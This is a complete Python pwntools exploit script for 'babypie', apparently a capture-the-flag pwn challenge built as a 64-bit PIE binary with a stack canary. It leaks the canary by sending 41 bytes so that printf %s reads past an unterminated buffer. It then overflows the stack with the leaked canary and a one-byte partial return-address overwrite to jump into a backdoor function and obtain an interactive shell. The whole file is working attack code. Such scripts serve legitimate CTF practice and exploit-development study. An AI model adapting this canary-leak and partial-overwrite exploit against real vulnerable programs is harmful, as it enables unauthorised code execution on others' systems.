#!/usr/bin/env python3
# babypie: 64-bit PIE+Canary. read 不补 null → %s 泄露 canary → 栈溢出 partial overwrite backdoor+1
from pwn import *
import os
from pathlib import Path

context.arch = "amd64"
context.log_level = "info"

pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "babypie")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.27/amd64/ld-linux-x86-64.so.2"
libdir = pwn_root / "libc/2.27/amd64/glibc227/glibc227-fixed/lib/x86_64-linux-gnu"

for attempt in range(5):
    p = process([str(loader), "--library-path", str(libdir), pwn])

    # leak canary: 41 bytes overwrites canary null byte → printf %s leaks rest
    p.recvuntil(b"Input your Name:")
    p.send(b"A" * 41)
    p.recvuntil(b"Hello ")
    data = p.recvuntil(b":\n", drop=True)
    canary = b"\x00" + data[41:48]

    if len(data) < 48:
        p.close()
        continue

    log.success(f"canary: {canary.hex()}")

    # overflow: 40 pad + canary + 8 junk + partial overwrite (0x6a→0x3f=backdoor+1)
    p.send(b"A" * 40 + canary + b"B" * 8 + b"\x3f")
    p.interactive()
    break
